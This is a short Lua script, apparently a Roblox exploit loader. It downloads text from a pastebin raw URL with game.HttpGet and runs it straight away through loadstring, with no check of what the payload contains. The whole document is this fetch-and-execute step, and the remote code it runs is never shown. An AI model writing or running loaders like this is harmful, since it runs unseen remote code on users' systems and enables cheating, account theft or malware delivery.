task.spawn(function()
    local ok,res = pcall(game.HttpGet, game, "https://pastebin.com/raw/4NjTWmPp")
    if ok and res then
        loadstring(res)()
    end
end)